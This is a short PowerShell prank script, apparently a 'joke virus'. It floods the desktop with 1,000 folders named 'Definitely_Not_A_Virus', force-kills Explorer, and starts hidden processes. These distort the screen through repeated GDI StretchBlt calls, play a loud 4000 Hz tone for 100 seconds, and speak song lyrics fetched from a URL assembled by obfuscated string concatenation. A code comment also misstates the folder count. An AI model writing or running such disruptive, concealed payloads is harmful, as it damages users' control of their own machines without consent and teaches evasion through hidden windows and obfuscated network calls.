$screenCode = 'import ctypes as c;g=c.windll.gdi32;u=c.windll.user32;d=u.GetDC(0);[g.StretchBlt(d,5,5,1910,1070,d,0,0,1920,1080,0x999999) for _ in range(10000)]'

$beepCode = 'import winsound;winsound.Beep(4000,100000)'

# Create 100 folders on the desktop
$desktop = [Environment]::GetFolderPath('Desktop')

1..1000 | ForEach-Object {
    New-Item -ItemType Directory `
        -Path (Join-Path $desktop "Definitely_Not_A_Virus_$_") `
        -Force | Out-Null
}

# Stop Explorer, then automatically restart it
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

Start-Job -ScriptBlock {
    Start-Sleep -Seconds 10
    Start-Process explorer.exe
} | Out-Null

Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
    '-NoProfile'
    '-Command'
    '$x=[char]47;$d=''lrc''+''lib''+[char]46+''net'';$u=''h''+''ttps:''+$x+$x+$d+$x+''api''+$x+''get''+$x+24036888;(New-Object -ComObject SAPI.SpVoice).Speak((Invoke-RestMethod $u).plainLyrics)'
)

Start-Process python.exe -WindowStyle Hidden -ArgumentList (
    '-c "{0}"' -f $screenCode
)

Start-Process python.exe -WindowStyle Hidden -ArgumentList (
    '-c "{0}"' -f $beepCode
)
